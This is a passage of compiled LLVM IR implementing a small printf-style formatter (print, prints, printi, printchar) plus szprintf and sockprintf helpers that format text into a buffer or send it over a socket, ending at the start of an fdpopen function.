12:                                               ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

17:                                               ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

22:                                               ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

29:                                               ; preds = %22
  br label %286

30:                                               ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

35:                                               ; preds = %30
  br label %275

36:                                               ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

41:                                               ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

44:                                               ; preds = %41, %36
  br label %45

45:                                               ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

50:                                               ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45, !llvm.loop !11

55:                                               ; preds = %45
  br label %56

56:                                               ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

61:                                               ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

66:                                               ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

68:                                               ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

77:                                               ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56, !llvm.loop !12

80:                                               ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

85:                                               ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

90:                                               ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

96:                                               ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

101:                                              ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

109:                                              ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

111:                                              ; preds = %101
  br label %112

112:                                              ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.112, i64 0, i64 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** noundef %106, i8* noundef %113, i32 noundef %114, i32 noundef %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

119:                                              ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

124:                                              ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
  br i1 %129, label %130, label %136

130:                                              ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

136:                                              ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

141:                                              ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** noundef %125, i32 noundef %143, i32 noundef 10, i32 noundef 1, i32 noundef %144, i32 noundef %145, i32 noundef 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

149:                                              ; preds = %119
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

154:                                              ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

160:                                              ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

166:                                              ; preds = %154
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

171:                                              ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** noundef %155, i32 noundef %173, i32 noundef 16, i32 noundef 0, i32 noundef %174, i32 noundef %175, i32 noundef 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

179:                                              ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

184:                                              ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

190:                                              ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

196:                                              ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

201:                                              ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** noundef %185, i32 noundef %203, i32 noundef 16, i32 noundef 0, i32 noundef %204, i32 noundef %205, i32 noundef 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

209:                                              ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

214:                                              ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

220:                                              ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

226:                                              ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

231:                                              ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** noundef %215, i32 noundef %233, i32 noundef 10, i32 noundef 0, i32 noundef %234, i32 noundef %235, i32 noundef 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

239:                                              ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
  br i1 %243, label %244, label %273

244:                                              ; preds = %239
  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

249:                                              ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

255:                                              ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

260:                                              ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** noundef %266, i8* noundef %267, i32 noundef %268, i32 noundef %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

273:                                              ; preds = %239
  br label %282

274:                                              ; preds = %17
  br label %275

275:                                              ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** noundef %276, i32 noundef %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

282:                                              ; preds = %275, %273
  br label %283

283:                                              ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12, !llvm.loop !13

286:                                              ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

289:                                              ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

292:                                              ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @prints(i8** noundef %0, i8* noundef %1, i32 noundef %2, i32 noundef %3) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

15:                                               ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

17:                                               ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

21:                                               ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

24:                                               ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17, !llvm.loop !14

27:                                               ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

31:                                               ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

32:                                               ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

36:                                               ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

41:                                               ; preds = %40, %36
  br label %42

42:                                               ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

46:                                               ; preds = %42
  br label %47

47:                                               ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

50:                                               ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** noundef %51, i32 noundef %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

55:                                               ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47, !llvm.loop !15

58:                                               ; preds = %47
  br label %59

59:                                               ; preds = %58, %42
  br label %60

60:                                               ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

64:                                               ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** noundef %65, i32 noundef %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

71:                                               ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60, !llvm.loop !16

74:                                               ; preds = %60
  br label %75

75:                                               ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

78:                                               ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** noundef %79, i32 noundef %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

83:                                               ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75, !llvm.loop !17

86:                                               ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @printi(i8** noundef %0, i32 noundef %1, i32 noundef %2, i32 noundef %3, i32 noundef %4, i32 noundef %5, i32 noundef %6) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

25:                                               ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** noundef %28, i8* noundef %29, i32 noundef %30, i32 noundef %31)
  store i32 %32, i32* %8, align 4
  br label %102

33:                                               ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

36:                                               ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

39:                                               ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

42:                                               ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

45:                                               ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

50:                                               ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

53:                                               ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

59:                                               ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

65:                                               ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50, !llvm.loop !18

74:                                               ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

77:                                               ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

80:                                               ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

84:                                               ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** noundef %85, i32 noundef 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

90:                                               ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

93:                                               ; preds = %90, %84
  br label %94

94:                                               ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** noundef %96, i8* noundef %97, i32 noundef %98, i32 noundef %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

102:                                              ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @printchar(i8** noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

7:                                                ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

15:                                               ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 noundef 1, i8* noundef %16, i64 noundef 1)
  br label %18

18:                                               ; preds = %15, %7
  ret void
}

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32 noundef, i8* noundef, i64 noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @szprintf(i8* noundef %0, i8* noundef %1, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i64 0, i64 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i64 0, i64 0
  %10 = call i32 @print(i8** noundef %3, i8* noundef %8, %struct.__va_list_tag* noundef %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @sockprintf(i32 noundef %0, i8* noundef %1, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 noundef 2048) #12
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %10, i8 0, i64 2048, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %16 = call i32 @print(i8** noundef %5, i8* noundef %14, %struct.__va_list_tag* noundef %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i64 0, i64 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* noundef %20) #11
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.39, i64 0, i64 0), i8* noundef %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* noundef %27) #11
  %29 = call i64 @send(i32 noundef %25, i8* noundef %26, i64 noundef %28, i32 noundef 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* noundef %31) #12
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64 noundef) #4

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #5

declare i64 @send(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #3

; Function Attrs: nounwind
declare void @free(i8* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @fdpopen(i8* noundef %0, i8* noundef %1) #0 {
  %3 = alloca i32, align 4
